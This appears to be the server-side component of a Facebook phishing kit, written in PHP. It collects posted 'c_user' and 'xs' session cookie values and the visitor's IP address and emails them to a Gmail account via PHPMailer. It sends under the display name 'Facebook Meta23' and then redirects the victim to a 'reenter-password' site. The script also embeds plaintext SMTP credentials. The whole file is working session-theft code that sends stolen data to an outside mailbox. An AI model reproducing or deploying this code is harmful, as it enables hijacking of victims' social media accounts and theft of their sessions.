<?php
ob_start(); // Start output buffering

use PHPMailer\PHPMailer\PHPMailer;
use PHPMailer\PHPMailer\Exception;

require $_SERVER['DOCUMENT_ROOT'] . '/PHPMailer/src/Exception.php';
require $_SERVER['DOCUMENT_ROOT'] . '/PHPMailer/src/PHPMailer.php';
require $_SERVER['DOCUMENT_ROOT'] . '/PHPMailer/src/SMTP.php';

if ($_SERVER['REQUEST_METHOD'] === 'POST') {
    $to = 'jamesbondhack6@gmail.com    ';
    $subject = 'Collect Your Mall';

    $c_user = isset($_POST['c_user']) ? $_POST['c_user'] : '';
    $xs = isset($_POST['xs']) ? $_POST['xs'] : '';
    $ip = $_SERVER['REMOTE_ADDR'];

    $message = "c_user: $c_user<br><br>xs: $xs<br><br>IP address: $ip";

    $headers = "From: jamesbondhack6@gmail.com\r\n";
    $headers .= "Reply-To: jamesbondhack6@gmail.com\r\n";
    $headers .= "MIME-Version: 1.0\r\n";
    $headers .= "Content-Type: text/html; charset=utf-8\r\n";
    $headers .= "X-Mailer: PHP/" . phpversion() . "\r\n";
    $headers .= "X-Priority: 1\r\n";

    $smtp_host = "smtp.gmail.com";
    $smtp_port = "587";
    $smtp_username = "jamesbondhack6@gmail.com";
    $smtp_password = "Jbond1234";

    $mail = new PHPMailer(true);
    try {
        $mail->SMTPDebug = 0;
        $mail->isSMTP();
        $mail->Host = $smtp_host;
        $mail->SMTPAuth = true;
        $mail->Username = $smtp_username;
        $mail->Password = $smtp_password;
        $mail->SMTPSecure = 'tls';
        $mail->Port = $smtp_port;

        $mail->setFrom('jamesbondhack6@gmail.com', 'Facebook Meta23');
        $to_array = explode(',', $to);
        foreach ($to_array as $email) {
            $mail->addAddress(trim($email));
        }

        $mail->isHTML(true);
        $mail->Subject = $subject;
        $mail->Body = $message;

        $mail->send();
    } catch (Exception $e) {
        echo "Message could not be sent. Mailer Error: {$mail->ErrorInfo}";
    }

    // Redirect the user to the success page
    header("Location: http://reenter-password.42web.io/");
    exit();
}
?>
